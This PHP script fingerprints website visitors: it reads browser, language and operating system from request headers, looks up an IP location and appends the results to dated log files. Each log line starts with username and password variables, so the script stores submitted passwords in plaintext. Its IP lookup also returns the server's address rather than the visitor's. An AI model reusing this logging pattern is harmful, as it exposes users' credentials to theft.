<?php
error_reporting(0);
//网上找不到完全OK的功能，所以自己写了个新的，获取地址功能需要文件在服务器
header("Content:Content-type:text/html;charset=utf-8");
date_default_timezone_set("PRC");//设置时区

//      // 作用取得客户端的ip、地理位置、浏览器、以及访问设备
     class get_equipment_info{ 
      ////获得访客浏览器类型
        function GetBrowser() {
            $user_OSagent = $_SERVER['HTTP_USER_AGENT'];
            if (strpos($user_OSagent, "Maxthon") && strpos($user_OSagent, "MSIE")) {
                $visitor_browser = "Maxthon(Microsoft IE)";
            } elseif (strpos($user_OSagent, "Maxthon 2.0")) {
                $visitor_browser = "Maxthon 2.0";
            } elseif (strpos($user_OSagent, "Maxthon")) {
                $visitor_browser = "Maxthon";
            } elseif (strpos($user_OSagent, "Edge")) {
                $visitor_browser = "Edge";
            } elseif (strpos($user_OSagent, "Trident")) {
                $visitor_browser = "IE";
            } elseif (strpos($user_OSagent, "MSIE")) {
                $visitor_browser = "IE";
            } elseif (strpos($user_OSagent, "MSIE")) {
                $visitor_browser = "MSIE 较高版本";
            } elseif (strpos($user_OSagent, "NetCaptor")) {
                $visitor_browser = "NetCaptor";
            } elseif (strpos($user_OSagent, "Netscape")) {
                $visitor_browser = "Netscape";
            } elseif (strpos($user_OSagent, "Chrome")) {
                $visitor_browser = "Chrome";
            } elseif (strpos($user_OSagent, "Lynx")) {
                $visitor_browser = "Lynx";
            } elseif (strpos($user_OSagent, "Opera")) {
                $visitor_browser = "Opera";
            } elseif (strpos($user_OSagent, "MicroMessenger")) {
                $visitor_browser = "微信浏览器";
            } elseif (strpos($user_OSagent, "Konqueror")) {
                $visitor_browser = "Konqueror";
            } elseif (strpos($user_OSagent, "Mozilla/5.0")) {
                $visitor_browser = "Mozilla";
            } elseif (strpos($user_OSagent, "Firefox")) {
                $visitor_browser = "Firefox";
            } elseif (strpos($user_OSagent, "U")) {
                $visitor_browser = "Firefox";
            } else {
                $visitor_browser = "其它";
            }
            //return $visitor_browser;
            return json_encode("浏览器:".$visitor_browser."|");
        }
      ////获得访客浏览器语言
      function GetLang()
      {
           if(!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
               $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
               $lang = substr($lang,0,5);
                if(preg_match("/zh-cn/i",$lang)){
                   $lang = "简体中文";
                }elseif(preg_match("/zh/i",$lang)){
                   $lang = "繁体中文";
                }else{
                   $lang = "English";
                }
                return json_encode("语言:".$lang."|"); 
           }else{
            return "获取浏览器语言失败！";
            }
      }
       
     //获取客户端操作系统信息包括win10
    function GetOs(){
        $agent = $_SERVER['HTTP_USER_AGENT'];
        $os = false;
    
        if (preg_match('/win/i', $agent) && strpos($agent, '95'))
        {
            $os = 'Windows 95';
        }
        else if (preg_match('/win 9x/i', $agent) && strpos($agent, '4.90'))
        {
            $os = 'Windows ME';
        }
        else if (preg_match('/win/i', $agent) && preg_match('/98/i', $agent))
        {
            $os = 'Windows 98';
        }
        else if (preg_match('/win/i', $agent) && preg_match('/nt 6.0/i', $agent))
        {
            $os = 'Windows Vista';
        }
        else if (preg_match('/win/i', $agent) && preg_match('/nt 6.1/i', $agent))
        {
            $os = 'Windows 7';
        }
        else if (preg_match('/win/i', $agent) && preg_match('/nt 6.2/i', $agent))
        {
            $os = 'Windows 8';
        }else if(preg_match('/win/i', $agent) && preg_match('/nt 10.0/i', $agent))
        {
            $os = 'Windows 10';#添加win10判断
        }else if (preg_match('/win/i', $agent) && preg_match('/nt 5.1/i', $agent))
        {
            $os = 'Windows XP';
        }
        else if (preg_match('/win/i', $agent) && preg_match('/nt 5/i', $agent))
        {
            $os = 'Windows 2000';
        }
        else if (preg_match('/win/i', $agent) && preg_match('/nt/i', $agent))
        {
            $os = 'Windows NT';
        }
        else if (preg_match('/win/i', $agent) && preg_match('/32/i', $agent))
        {
            $os = 'Windows 32';
        }
        else if (preg_match('/linux/i', $agent))
        {
            $os = 'Linux';
        }
        else if (preg_match('/unix/i', $agent))
        {
            $os = 'Unix';
        }
        else if (preg_match('/sun/i', $agent) && preg_match('/os/i', $agent))
        {
            $os = 'SunOS';
        }
        else if (preg_match('/ibm/i', $agent) && preg_match('/os/i', $agent))
        {
            $os = 'IBM OS/2';
        }
        else if (preg_match('/Mac/i', $agent) && preg_match('/PC/i', $agent))
        {
            $os = 'Macintosh';
        }
        else if (preg_match('/PowerPC/i', $agent))
        {
            $os = 'PowerPC';
        }
        else if (preg_match('/AIX/i', $agent))
        {
            $os = 'AIX';
        }
        else if (preg_match('/HPUX/i', $agent))
        {
            $os = 'HPUX';
        }
        else if (preg_match('/NetBSD/i', $agent))
        {
            $os = 'NetBSD';
        }
        else if (preg_match('/BSD/i', $agent))
        {
            $os = 'BSD';
        }
        else if (preg_match('/OSF1/i', $agent))
        {
            $os = 'OSF1';
        }
        else if (preg_match('/IRIX/i', $agent))
        {
            $os = 'IRIX';
        }
        else if (preg_match('/FreeBSD/i', $agent))
        {
            $os = 'FreeBSD';
        }
        else if (preg_match('/teleport/i', $agent))
        {
            $os = 'teleport';
        }
        else if (preg_match('/flashget/i', $agent))
        {
            $os = 'flashget';
        }
        else if (preg_match('/webzip/i', $agent))
        {
            $os = 'webzip';
        }
        else if (preg_match('/offline/i', $agent))
        {
            $os = 'offline';
        }
        else
        {
            $os = '未知操作系统';
        }
        return json_encode("系统:".$os."|"); 
    }

}
/**
 * 获取 IP  地理位置
 * 淘宝IP接口
 * @Return: array
 *///本来想curl获得网页的ip，结果发现了json传过来的ip，就直接用了
    function Getip()  
      {  //希望这个api不要那么快失效，失效得找个直接获取ip值，或者curl网页获取ip
         $data = json_decode(file_get_contents("http://ip.taobao.com/service/getIpInfo2.php?ip=myip"), true);
        if ($data) {  
             return $data;  //淘宝取到json数据
         } else {  
             return "获取本地IP失败！";  
        }  
     }  

      $data=Getip();
      $info = new get_equipment_info();
      //echo json_decode($info -> GetLang());
      //echo json_decode($info -> GetOs());
      //echo json_decode($info -> GetBrowser());
      //echo json_decode($info -> Getip());
      //集合输出
      $message=@$username."|".@$password."|".$data['data']['ip']."|".$data['data']['region'].$data['data']['city'].$data['data']['isp']."|".json_decode($info -> GetLang()).json_decode($info -> GetOs()).json_decode($info -> GetBrowser()).date("H:i:s");
     
    //echo $message;//113.70.47.90|广东佛山电信|浏览器语言:简体中文|系统:Windows 7|浏览器为Chrome|
 
class Log {

    private $maxsize = 1024000; //最大文件大小1M
    
    //写入日志
    public function writeLog($filename,$msg){
        //$res = array();
        //$res['msg'] = $msg;
        //$res['logtime'] = date("Y-m-d H:i:s",time());
        
        //如果日志文件超过了指定大小则备份日志文件
        if(file_exists($filename) && (abs(filesize($filename)) > $this->maxsize)){
            $newfilename = dirname($filename).'/'.time().'-'.basename($filename);
            rename($filename, $newfilename);
        }

        //如果是新建的日志文件，去掉内容中的第一个字符逗号
        if(file_exists($filename) && abs(filesize($filename))>0){
            $content = "\n".$msg;
        }else{
            $content = $msg;
        }

        //往日志文件内容后面追加日志内容
        file_put_contents($filename, $content, FILE_APPEND);
    }   

    //读取日志
    public function readLog($filename){
        if(file_exists($filename)){
            $content = file_get_contents($filename);
            $json = json_decode('['.$content.']',true);
        }else{
            $json = '{"msg":"The file does not exist."}';
        }
        return $json;
    }//读日记调用方法//$loglist = $Log->readLog($filename);
}
//写到日记，调用方法，注意：请先创建logs文件夹
        $filename = "logs/log_" . date("Ymd", time()) . ".txt";
        $Log = new Log();
        $Log->writeLog($filename, $message);
        return $message;
die;//如不需要log功能，删除log类220-261